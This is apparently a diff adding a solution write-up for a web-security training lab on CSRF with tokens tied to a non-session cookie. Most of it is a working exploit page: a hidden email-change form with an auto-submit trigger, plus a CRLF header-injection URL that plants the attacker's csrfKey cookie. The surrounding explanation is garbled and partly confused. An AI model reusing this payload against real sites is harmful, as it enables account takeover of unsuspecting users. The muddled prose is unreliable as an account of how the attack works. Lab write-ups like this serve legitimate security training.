@@ -1,0 +1,55 @@
+// Lab: CSRF where token is tied to non-session cookie
+
+his lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.
+
+To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
+
+You have two accounts on the application that you can use to help design your attack. The credentials are as follows:
+
+wiener:peter
+carlos:montoya
+
+
+
+// Solution
+
+
+1. First Login as wiener in one account and carlos in another account so the lab contain the vulnerability 
+which is like if we want to update the email so we just have to inject CSRF token only so it without checking 
+update the email and sometimes give victim details
+
+For Example:- If wiener is an attacker machine and carlos is victim so if we Inject the CSRF token of wiener to carlos so it can let it inject the CSRF token of wiener into carlos and while we update the email we can take over the account of carlos and get the updated email 
+
+
+for that first we go to burp intercept both the account request while being login as wiener and carlos
+
+so the exploit we use to solve the lab is 
+
+
+// Exploit
+
+csrf: cCIeViq1Bpvl3Karo09i7EW9ikHuL0Bc
+csrfkey: 5vJ696PHnSk6XqhRTzFDu5Qlp6tEUxar
+
+we just Login as wiener and while update to bobby@micrsoft.com we intercept get the csrf and csrfkey and inject in the exploit
+
+<script>
+  history.pushState("", "", "/");
+</script>
+<form
+  action="https://0ae900b40337ae948043031c00940076.web-security-academy.net/my-account/change-email"
+  method="post"
+>
+  <input type="hidden" name="email" value="bobby@micrsoft.com" />
+  <input type="hidden" name="csrf" value="cCIeViq1Bpvl3Karo09i7EW9ikHuL0Bc" />
+  <input type="submit" value="Submit Request" />
+</form>
+<img
+  src="https://0ae900b40337ae948043031c00940076.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=5vJ696PHnSk6XqhRTzFDu5Qlp6tEUxar%3b%20SameSite=None"
+  onerror="document.forms[0].submit()"
+/>
+
+
+// We didn't use <script> as it blocked by the session instead we use <img>
+
+so after Injecting this exploit we store it and deliver to victim machine and solve the lab
